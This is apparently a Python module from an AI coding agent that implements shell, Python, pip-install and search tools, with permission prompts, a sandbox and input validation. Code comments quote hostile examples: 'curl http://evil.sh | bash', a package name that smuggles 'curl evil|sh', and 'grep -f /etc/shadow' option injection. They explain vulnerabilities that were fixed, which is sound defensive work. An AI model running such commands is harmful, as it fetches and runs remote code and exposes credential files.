"""Shell, Python, package-install, and subprocess-backed search tools."""

from __future__ import annotations

import asyncio
import importlib.util
import re
import shlex
import shutil
import sys
import tempfile
from contextlib import suppress
from pathlib import Path

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt

from magent.permissions import (
    PermissionResult,
    RiskTier,
    classify_shell_command,
    shell_pattern_matches,
)
from magent.sandbox import execute_plan_sandbox, sandbox_plan_preview
from magent.subprocess_util import run_tracked
from magent.tools.types import ToolResult

console = Console()

# PEP 508 / PEP 440 shapes, so package specs can never carry shell syntax.
_PEP508_NAME = re.compile(r"^[A-Za-z0-9]([A-Za-z0-9._-]*[A-Za-z0-9])?$")
_PEP508_EXTRAS = re.compile(r"^\[[A-Za-z0-9]([A-Za-z0-9._,-]*[A-Za-z0-9])?\]$")
_PEP440_VERSION = re.compile(r"^[A-Za-z0-9]([A-Za-z0-9.!+*_-]*[A-Za-z0-9])?$")


def _installed_version(distribution: str) -> str:
    """Installed version of a distribution, or "" when it is absent."""
    try:
        from importlib.metadata import version

        return version(distribution)
    except Exception:
        return ""


def _uses_shell_syntax(command: str) -> bool:
    """Return true when a command needs shell parsing beyond argv splitting."""
    return bool(re.search(r"(\|\||&&|[;\n|<>]|\$\(|\{[^{}\s]+,[^{}]+})", command))


def _effective_shell_timeout(command: str, requested_timeout: int) -> int:
    """Give known package-install commands enough time unless caller overrides."""
    if requested_timeout != 60:
        return requested_timeout
    lowered = f" {command.lower()} "
    package_install_markers = (
        " npm install",
        " npm ci",
        " yarn install",
        " pnpm install",
        " bun install",
    )
    if any(marker in lowered for marker in package_install_markers):
        return 300
    return requested_timeout


async def _create_shell_process(command: str, cwd: str | Path) -> asyncio.subprocess.Process:
    """Run shell syntax through bash when available so brace expansion behaves."""
    bash = shutil.which("bash")
    if bash:
        return await asyncio.create_subprocess_exec(
            bash,
            "-lc",
            command,
            cwd=cwd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
    return await asyncio.create_subprocess_shell(
        command,
        cwd=cwd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )


async def _create_exec_process(*argv: str, cwd: str | Path) -> asyncio.subprocess.Process:
    return await asyncio.create_subprocess_exec(
        *argv,
        cwd=cwd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )


def _prefer_platform_python_command(command: str, *, platform: str | None = None) -> str:
    """On macOS, prefer the Python 3 command family over ambiguous python/pip."""
    if (platform or sys.platform) != "darwin":
        return command
    rewritten = re.sub(r"(^|[;&|\n]\s*)pip(?=\s)", r"\1python3 -m pip", command)
    return re.sub(r"(^|[;&|\n]\s*)python(?=\s)", r"\1python3", rewritten)


def _shell_native_file_tool_guidance(command: str) -> str:
    """Return guidance when shell is used for work native file tools should do."""
    scrubbed = re.sub(r"\b[12]?>&[12]\b", "", command)
    scrubbed = re.sub(r"\b[12]?>\s*/dev/null\b", "", scrubbed)
    if "<<" in scrubbed or re.search(r"(?<![<>&])>>?(?![>&])", scrubbed):
        return "Shell redirection/heredocs are not used for file writes. Use write_file or edit_file instead."

    try:
        argv = shlex.split(command)
    except ValueError:
        argv = []
    head = Path(argv[0]).name.lower() if argv else ""
    if head in {"tee", "touch"}:
        return f"`{head}` writes files. Use write_file or edit_file instead."

    lower = command.lower()
    if head in {"python", "python3"} and (
        "open(" in lower
        or ".write_text(" in lower
        or ".write_bytes(" in lower
        or "path(" in lower
    ):
        return "Python shell snippets that write files are disabled. Use write_file or edit_file instead."
    return ""


class ShellToolsMixin:
    """Shell/process capability implementation mixed into the tool executor."""

    cwd: str
    permission_mode: str
    allowed_shell_patterns: list[str]
    trusted_shell_patterns: list[str]
    session_shell_patterns: list[str]
    show_tool_calls: bool
    username: str
    interactive_permissions: bool
    shell_sandbox: str
    shell_sandbox_network: bool
    _active_processes: set[asyncio.subprocess.Process]

    def _log_tool(self, name: str, desc: str, tier: RiskTier) -> None:
        raise NotImplementedError

    def _check_permission(self, action_description: str, tier: RiskTier) -> PermissionResult:
        raise NotImplementedError

    def _permission_denied(self, perm: PermissionResult) -> ToolResult:
        raise NotImplementedError

    def _path_tier(self, op: str, path: str) -> tuple[Path, RiskTier]:
        raise NotImplementedError

    def _trusted_shell_match(self, command: str) -> bool:
        patterns = [*self.trusted_shell_patterns, *self.session_shell_patterns]
        return any(shell_pattern_matches(pattern, command) for pattern in patterns)

    def _remember_trusted_shell_pattern(self, command: str) -> None:
        try:
            from magent.config import load_user_profile, save_user_profile

            profile = load_user_profile(self.username)
            permissions = profile.setdefault("permissions", {})
            patterns = list(permissions.get("trusted_shell_patterns") or [])
            if command not in patterns:
                patterns.append(command)
            permissions["trusted_shell_patterns"] = patterns
            save_user_profile(self.username, profile)
            self.trusted_shell_patterns = patterns
        except Exception:
            self.session_shell_patterns.append(command)

    def _shell_trust_pattern(self, command: str, tier: RiskTier) -> str:
        """Return what to remember when a user approves a command.

        Saved approvals are stored verbatim. Generalising them to shapes like
        ``curl * | *`` meant one approval covered every later pipeline with the
        same head — including ``curl http://evil.sh | bash`` — because a
        ``fnmatch`` wildcard happily spans ``|`` and ``;``.
        """
        return command.strip()

    def _check_shell_permission(self, command: str, tier: RiskTier) -> PermissionResult:
        if self._trusted_shell_match(command):
            return PermissionResult(True, RiskTier.AUTO, "trusted-shell")
        if not self.interactive_permissions or self.permission_mode == "yolo":
            return self._check_permission(f"Run: `{command}`", tier)
        if tier < RiskTier.CONFIRM:
            return PermissionResult(True, tier, "auto")
        title = (
            "[red]\u26a0 Permission Required[/red]"
            if tier == RiskTier.BLOCK
            else "[yellow]Permission[/yellow]"
        )
        border = "red" if tier == RiskTier.BLOCK else "yellow"
        console.print(
            Panel(
                f"[bold]{'High risk shell action' if tier == RiskTier.BLOCK else 'Shell action requires confirmation'}[/bold]\n\n"
                f"Run: `{command}`\n\n"
                "[dim]Choose whether this approval should last once, for this session, or be saved for future sessions.[/dim]",
                title=title,
                border_style=border,
            )
        )
        choice = Prompt.ask(
            "Approve",
            choices=["once", "session", "always", "no", "o", "s", "a", "n"],
            default="once" if tier == RiskTier.CONFIRM else "no",
        ).lower()
        if choice in {"no", "n"}:
            return PermissionResult(False, tier, "user-denied")
        if choice in {"session", "s"}:
            pattern = self._shell_trust_pattern(command, tier)
            if pattern not in self.session_shell_patterns:
                self.session_shell_patterns.append(pattern)
            console.print(f"[dim]Approved for this session; running `{command}`.[/dim]")
            return PermissionResult(True, tier, "user-session-allow")
        if choice in {"always", "a"}:
            pattern = self._shell_trust_pattern(command, tier)
            self._remember_trusted_shell_pattern(pattern)
            console.print(f"[dim]Saved approval for `{pattern}`; running `{command}`.[/dim]")
            return PermissionResult(True, tier, "user-persistent-allow")
        console.print(f"[dim]Approved once; running `{command}`.[/dim]")
        return PermissionResult(True, tier, "user-confirmed")

    def _sandbox_argv(self, command: str) -> list[str] | None:
        """Wrap a command in the configured isolation profile, if any."""
        profile = str(getattr(self, "shell_sandbox", "") or "off")
        if profile == "off":
            return None
        from magent.sandbox import wrap_shell_command

        try:
            return wrap_shell_command(
                command,
                profile=profile,
                cwd=self.cwd,
                network=bool(getattr(self, "shell_sandbox_network", False)),
            )
        except (ValueError, RuntimeError) as error:
            console.print(f"[yellow]Shell sandbox unavailable ({error}); running unsandboxed.[/yellow]")
            return None

    async def run_shell(self, command: str, timeout: int = 60) -> ToolResult:
        original_command = command
        command = _prefer_platform_python_command(command)
        timeout = _effective_shell_timeout(command, timeout)
        if command != original_command and self.show_tool_calls:
            console.print(f"[dim]Using macOS Python command: `{command}`[/dim]")
        native_guidance = _shell_native_file_tool_guidance(command)
        if native_guidance:
            self._log_tool("run_shell", command, RiskTier.BLOCK)
            return {
                "ok": False,
                "error": native_guidance,
                "blocked_by": "native-file-tool-policy",
                "recommended_tool": "write_file",
            }
        tier = (
            RiskTier.AUTO
            if self._trusted_shell_match(command)
            else classify_shell_command(command, self.allowed_shell_patterns)
        )
        self._log_tool("run_shell", command, tier)
        perm = self._check_shell_permission(command, tier)
        if not perm.approved:
            return self._permission_denied(perm)
        try:
            try:
                argv = shlex.split(command)
            except ValueError as e:
                return {"ok": False, "error": f"Invalid shell syntax: {e}"}
            if not argv:
                return {"ok": False, "error": "Empty command"}
            sandboxed = self._sandbox_argv(command)
            if sandboxed is not None:
                proc = await _create_exec_process(*sandboxed, cwd=self.cwd)
            elif _uses_shell_syntax(command):
                proc = await _create_shell_process(command, self.cwd)
            else:
                proc = await _create_exec_process(*argv, cwd=self.cwd)
            self._active_processes.add(proc)
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            except TimeoutError:
                with suppress(ProcessLookupError):
                    proc.kill()
                with suppress(Exception):
                    await proc.wait()
                return {"ok": False, "error": f"Command timed out after {timeout}s"}
            except asyncio.CancelledError:
                with suppress(ProcessLookupError):
                    proc.kill()
                with suppress(Exception):
                    await proc.wait()
                raise
            finally:
                self._active_processes.discard(proc)
            if self.show_tool_calls and tier >= RiskTier.CONFIRM:
                output_bytes = len(stdout) + len(stderr)
                status = "completed" if proc.returncode == 0 else f"exited {proc.returncode}"
                console.print(f"[dim]Shell command {status}; captured {output_bytes} bytes.[/dim]")
            return {
                "ok": proc.returncode == 0,
                "returncode": proc.returncode,
                "stdout": stdout.decode("utf-8", errors="replace"),
                "stderr": stderr.decode("utf-8", errors="replace"),
            }
        except Exception as e:
            return {"ok": False, "error": str(e)}

    async def run_python(self, code: str, timeout: int = 30) -> ToolResult:
        """Execute Python code in an isolated subprocess and capture output."""
        tier = RiskTier.CONFIRM
        self._log_tool("run_python", f"{len(code)} chars of Python", tier)
        perm = self._check_permission("Execute Python code snippet", tier)
        if not perm.approved:
            return self._permission_denied(perm)
        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as handle:
                handle.write(code)
                tmp_path = handle.name
            proc = await _create_exec_process(sys.executable, tmp_path, cwd=self.cwd)
            self._active_processes.add(proc)
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            except TimeoutError:
                with suppress(ProcessLookupError):
                    proc.kill()
                with suppress(Exception):
                    await proc.wait()
                return {"ok": False, "error": f"Python execution timed out after {timeout}s"}
            except asyncio.CancelledError:
                with suppress(ProcessLookupError):
                    proc.kill()
                with suppress(Exception):
                    await proc.wait()
                raise
            finally:
                self._active_processes.discard(proc)
                Path(tmp_path).unlink(missing_ok=True)
            return {
                "ok": proc.returncode == 0,
                "returncode": proc.returncode,
                "stdout": stdout.decode("utf-8", errors="replace")[:8000],
                "stderr": stderr.decode("utf-8", errors="replace")[:2000],
            }
        except Exception as e:
            return {"ok": False, "error": str(e)}

    async def install_package(self, package: str, version: str = "") -> ToolResult:
        """Install a Python package through the active interpreter's pip."""
        tier = RiskTier.CONFIRM

        # `package` and `version` used to be interpolated straight into a shell
        # string, so `package="x; curl evil|sh"` ran whatever it liked.
        if not _PEP508_NAME.match(package.split("[")[0].strip()):
            return {"ok": False, "error": f"Invalid package name: {package!r}", "package": package}
        extras = ""
        if "[" in package:
            if not _PEP508_EXTRAS.match(package[package.index("[") :]):
                return {"ok": False, "error": f"Invalid extras in {package!r}", "package": package}
            extras = package[package.index("[") :]
        if version and not _PEP440_VERSION.match(version.strip()):
            return {"ok": False, "error": f"Invalid version: {version!r}", "package": package}

        name = package.split("[")[0].strip()
        pkg_spec = f"{name}{extras}=={version.strip()}" if version else f"{name}{extras}"
        self._log_tool("install_package", pkg_spec, tier)

        # An explicit version has to be verified, not assumed: `find_spec`
        # only answers "is something by this name importable".
        module_name = name.replace("-", "_")
        if not version and importlib.util.find_spec(module_name) is not None:
            return {"ok": True, "already_installed": True, "package": pkg_spec}
        if version and _installed_version(name) == version.strip():
            return {"ok": True, "already_installed": True, "package": pkg_spec}

        perm = self._check_permission(f"pip install {pkg_spec}  (required for this task)", tier)
        if not perm.approved:
            denied = self._permission_denied(perm)
            denied["package"] = pkg_spec
            return denied

        try:
            proc = await _create_exec_process(
                sys.executable, "-m", "pip", "install", "--quiet", pkg_spec, cwd=self.cwd
            )
            self._active_processes.add(proc)
            try:
                _, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
            except TimeoutError:
                with suppress(ProcessLookupError):
                    proc.kill()
                with suppress(Exception):
                    await proc.wait()
                return {"ok": False, "error": "pip install timed out after 120s", "package": pkg_spec}
            finally:
                self._active_processes.discard(proc)
        except Exception as e:
            return {"ok": False, "error": str(e), "package": pkg_spec}

        if proc.returncode == 0:
            return {"ok": True, "installed": pkg_spec, "already_installed": False}
        return {
            "ok": False,
            "error": stderr.decode("utf-8", errors="replace").strip() or "pip failed",
            "package": pkg_spec,
        }

    async def search_codebase(self, pattern: str, path: str = ".") -> ToolResult:
        """Search project text with ripgrep, falling back to grep."""
        abs_path, tier = self._path_tier("read", path)
        self._log_tool("search_codebase", f"{pattern!r} in {abs_path}", tier)
        perm = self._check_permission(f"Search {abs_path}", tier)
        if not perm.approved:
            return self._permission_denied(perm)
        search_command = shutil.which("rg") or shutil.which("grep")
        if not search_command:
            return {"ok": False, "error": "No search tool found (rg or grep)"}
        # `--` terminates option parsing. Without it a pattern starting with "-"
        # became a flag: `grep -f /etc/shadow`, or ripgrep's `--pre` running an
        # arbitrary command.
        cmd = (
            ["rg", "--line-number", "--no-heading", "--", pattern, str(abs_path)]
            if Path(search_command).name == "rg"
            else ["grep", "-rn", "--", pattern, str(abs_path)]
        )
        try:
            run = await run_tracked(cmd, cwd=self.cwd, timeout=30, active=self._active_processes)
        except Exception as e:
            return {"ok": False, "error": str(e)}
        if run.get("timed_out"):
            return {"ok": False, "error": run["error"]}

        lines = str(run.get("stdout", "")).strip().splitlines()
        return {
            "ok": True,
            "matches": lines[:100],
            "truncated": len(lines) > 100,
            "total": len(lines),
        }

    async def git_op(self, subcommand: str, *args: str) -> ToolResult:
        """Run a Git subcommand through the shell permission policy."""
        command = f"git {subcommand} {' '.join(args)}"
        return await self.run_shell(command)


__all__ = [
    "ShellToolsMixin",
    "execute_plan_sandbox",
    "sandbox_plan_preview",
]
